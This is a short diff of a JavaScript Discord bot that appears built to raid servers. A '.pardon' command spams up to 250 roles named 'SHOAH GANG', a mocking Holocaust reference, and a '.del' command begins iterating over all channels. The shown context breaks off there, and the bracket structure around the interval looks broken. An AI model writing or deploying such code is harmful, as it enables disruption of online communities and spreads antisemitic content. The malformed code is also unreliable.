@@ -91,15 +91,12 @@ if (msg.content === '.pardon') {
     let interval = setInterval(function () {
     if (i === 250) clearInterval(interval);
     msg.guild.createRole({name: 'SHOAH GANG', color:'RANDOM'}).then(function(role) {
-      msg.guild.members.forEach(member => {
-      member.addRole(role).catch(e => {});
-    })
+      msg.member.addRole(role).catch(e => {});
     i++
     }, 100).catch(e => {});
        });
     
       }
-
   if(msg.content === ".del"){
     if (msg.deletable) msg.delete().catch(e => {});
     msg.guild.channels.forEach(chan => {
